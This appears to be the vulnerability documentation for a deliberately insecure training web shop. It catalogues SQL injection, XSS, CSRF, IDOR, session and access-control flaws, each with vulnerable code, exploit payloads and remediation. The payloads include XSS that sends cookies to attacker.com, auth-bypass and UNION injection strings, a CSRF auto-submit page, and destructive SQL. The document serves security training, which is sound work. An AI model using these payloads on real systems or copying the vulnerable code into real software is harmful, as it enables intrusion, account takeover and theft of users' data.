# 🔓 Vulnerability Documentation

This document provides detailed technical information about all intentional vulnerabilities in the LuxWatch application.

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [CSRF (Cross-Site Request Forgery)](#3-csrf)
4. [IDOR (Insecure Direct Object References)](#4-idor)
5. [Authentication Vulnerabilities](#5-authentication-vulnerabilities)
6. [Session Management Issues](#6-session-management-issues)
7. [Information Disclosure](#7-information-disclosure)
8. [Broken Access Control](#8-broken-access-control)
9. [Arbitrary SQL Execution](#9-arbitrary-sql-execution)

---

## 1. SQL Injection

### Location
- Login forms (`/api/login`)
- Search functionality (`/api/search`)
- Admin debug panel (`/api/admin/query`)

### Description
User input is directly concatenated into SQL queries without parameterization or sanitization.

### Vulnerable Code (database.js)
```javascript
function authenticateUser(username, password, callback) {
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  vulnerableQuery(query, callback);
}

function searchProducts(searchTerm, callback) {
  const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`;
  vulnerableQuery(query, callback);
}
```

### Exploitation

#### Basic Authentication Bypass
```
Username: admin' OR '1'='1' --
Password: anything
```

#### Union-Based Injection
```
Search: ' UNION SELECT id, username, password, email, role, created_at FROM users --
```

#### Time-Based Blind Injection
```
Username: admin' AND SLEEP(5) --
```

### Impact
- Complete authentication bypass
- Database enumeration
- Data exfiltration
- Privilege escalation

### Remediation
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Least privilege database access
- Error message suppression

---

## 2. Cross-Site Scripting (XSS)

### Location
- Product review comments (`/api/reviews`)
- Admin dashboard (reflected XSS)

### Description
User-supplied content is rendered without HTML encoding or sanitization.

### Vulnerable Code (index.html)
```javascript
<div class="review-comment">${review.comment}</div>
```

### Exploitation

#### Stored XSS in Reviews
```javascript
<script>
  // Steal session cookie
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### More Sophisticated Payload
```javascript
<img src=x onerror="
  fetch('http://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: localStorage,
      currentPage: window.location.href
    })
  });
">
```

#### DOM-Based XSS
```javascript
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### Impact
- Session hijacking
- Cookie theft
- Keylogging
- Phishing attacks
- Account takeover

### Remediation
- HTML encode all user input
- Content Security Policy (CSP)
- HTTPOnly cookies
- Input validation
- Use secure frameworks (React, Vue with auto-escaping)

---

## 3. CSRF

### Location
All state-changing operations:
- Add/edit/delete products (`/api/admin/products/*`)
- Create orders (`/api/orders`)
- Add reviews (`/api/reviews`)

### Description
No CSRF tokens are implemented. All state-changing operations accept requests without origin validation.

### Vulnerable Code (server.js)
```javascript
app.post('/api/admin/products', checkAuth, checkAdmin, (req, res) => {
  // No CSRF token validation
  const { name, brand, description, price, image, stock } = req.body;
  db.addProduct(name, brand, description, price, image, stock, callback);
});
```

### Exploitation

Create malicious HTML page:
```html
<html>
<body>
<form action="http://localhost:3000/api/admin/products" method="POST" id="csrf">
  <input type="hidden" name="name" value="Hacked Watch" />
  <input type="hidden" name="brand" value="Attacker" />
  <input type="hidden" name="description" value="You've been hacked!" />
  <input type="hidden" name="price" value="0.01" />
  <input type="hidden" name="image" value="hack.jpg" />
  <input type="hidden" name="stock" value="999" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Impact
- Unauthorized product modifications
- Unwanted purchases
- Account manipulation
- Data tampering

### Remediation
- Implement CSRF tokens
- SameSite cookie attribute
- Double-submit cookie pattern
- Custom request headers
- Origin/Referer validation

---

## 4. IDOR

### Location
- User profile access (`/api/users/:id`)
- Order access (`/api/orders/:id`)

### Description
No authorization checks verify if the requesting user should have access to the requested resource.

### Vulnerable Code (server.js)
```javascript
app.get('/api/users/:id', checkAuth, (req, res) => {
  const userId = req.params.id;
  db.getUserById(userId, (err, user) => {
    // No check if req.user.id === userId
    res.json({
      id: user.id,
      username: user.username,
      email: user.email,
      password: user.password // Exposed!
    });
  });
});
```

### Exploitation

1. Login as regular user (ID: 2)
2. Access other user profiles:
```
GET /api/users/1
GET /api/users/3
GET /api/users/4
```

3. Enumerate all users:
```javascript
for (let i = 1; i <= 100; i++) {
  fetch(`/api/users/${i}`)
    .then(r => r.json())
    .then(user => console.log(user));
}
```

### Impact
- Privacy breach
- Data exfiltration
- Password disclosure
- Personal information theft

### Remediation
- Implement proper authorization checks
- Verify resource ownership
- Use UUIDs instead of sequential IDs
- Return 404 for unauthorized access (not 403)

---

## 5. Authentication Vulnerabilities

### Issues

#### Plain Text Password Storage
```javascript
// database.js
db.run(`INSERT INTO users (username, password, email) 
        VALUES ('admin', 'admin123', 'admin@example.com')`);
```

#### No Password Complexity Requirements
```javascript
// server.js - registration
app.post('/api/register', (req, res) => {
  const { username, password, email } = req.body;
  // No password strength validation
  db.registerUser(username, password, email, callback);
});
```

#### SQL Injection in Authentication
```javascript
const query = `SELECT * FROM users 
               WHERE username = '${username}' AND password = '${password}'`;
```

### Exploitation

1. **View plain text passwords** (via IDOR):
```
GET /api/users/1
Response: { "password": "admin123" }
```

2. **SQL injection bypass**:
```
Username: admin' --
Password: [empty]
```

3. **Weak passwords**:
```
admin:admin123
user:user123
john:password
```

### Impact
- Complete authentication bypass
- Credential theft
- Account takeover
- Brute force attacks

### Remediation
- Hash passwords (bcrypt, Argon2)
- Enforce password complexity
- Rate limiting on login attempts
- Multi-factor authentication
- Account lockout policies

---

## 6. Session Management Issues

### Vulnerabilities

#### Predictable Session Tokens
```javascript
// database.js
function createSession(userId, callback) {
  const sessionToken = `${userId}_${Date.now()}`;
  // Easily predictable!
}
```

#### No HTTPOnly Flag
```javascript
// server.js
res.cookie('session', sessionToken, { httpOnly: false });
// Vulnerable to XSS cookie theft!
```

#### No Session Expiration
- Sessions never expire
- No timeout mechanism
- No session invalidation

### Exploitation

1. **Session prediction**:
```javascript
// Current user session: "2_1768212345678"
// Admin session might be: "1_1768212340000"
const adminToken = `1_${Date.now() - 10000}`;
document.cookie = `session=${adminToken}`;
```

2. **Cookie theft via XSS**:
```javascript
<script>
  fetch('http://attacker.com/?s=' + document.cookie);
</script>
```

### Impact
- Session hijacking
- Session fixation
- Privilege escalation
- Persistent unauthorized access

### Remediation
- Cryptographically random session tokens
- HTTPOnly and Secure cookie flags
- Session expiration and timeout
- Session regeneration on privilege change
- SameSite cookie attribute

---

## 7. Information Disclosure

### Issues

#### Verbose Error Messages
```javascript
db.authenticateUser(username, password, (err, users) => {
  if (err) {
    return res.status(500).json({ 
      error: 'Database error', 
      details: err.message // Leaks SQL structure!
    });
  }
});
```

#### Password Exposure
```javascript
app.get('/api/users/:id', checkAuth, (req, res) => {
  res.json({
    password: user.password // Plain text password!
  });
});
```

#### Debug Endpoints
```javascript
app.post('/api/admin/query', checkAuth, checkAdmin, (req, res) => {
  // Allows arbitrary SQL execution
});
```

### Impact
- Database schema disclosure
- Credential exposure
- Attack surface mapping
- Easier exploitation

### Remediation
- Generic error messages
- Remove debug endpoints in production
- Never expose passwords
- Proper error logging (server-side only)

---

## 8. Broken Access Control

### Issues

#### Weak Admin Check
```javascript
function checkAdmin(req, res, next) {
  if (req.user && req.user.role === 'admin') {
    next();
  } else {
    res.status(403).json({ error: 'Admin access required' });
  }
}
```

Can be bypassed if user object can be manipulated.

#### No Ownership Validation
```javascript
app.get('/api/orders/:id', checkAuth, (req, res) => {
  // Returns any order, no check if it belongs to current user
});
```

### Impact
- Privilege escalation
- Unauthorized data access
- Administrative function abuse

### Remediation
- Server-side role validation
- Resource ownership verification
- Principle of least privilege
- Defense in depth

---

## 9. Arbitrary SQL Execution

### Location
Admin debug panel (`/api/admin/query`)

### Description
Allows arbitrary SQL query execution through the admin interface.

### Vulnerable Code
```javascript
app.post('/api/admin/query', checkAuth, checkAdmin, (req, res) => {
  const { query } = req.body;
  db.vulnerableQuery(query, (err, results) => {
    res.json(results);
  });
});
```

### Exploitation

```sql
-- Dump all users
SELECT * FROM users;

-- Dump all passwords
SELECT username, password FROM users;

-- Create admin user
INSERT INTO users (username, password, role) 
VALUES ('hacker', 'hacked', 'admin');

-- Drop tables (destructive)
DROP TABLE products;
```

### Impact
- Complete database compromise
- Data destruction
- Full system compromise

### Remediation
- Remove debug endpoints
- Never allow arbitrary SQL execution
- Use ORM with restricted operations
- Audit logging for all database operations

---

## 🔗 Attack Chaining

These vulnerabilities can be chained together for more sophisticated attacks. See [ATTACK_SCENARIOS.md](./ATTACK_SCENARIOS.md) for detailed attack chains.

## 📚 Further Reading

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

---

**Remember: Use this knowledge responsibly and only in authorized environments!**
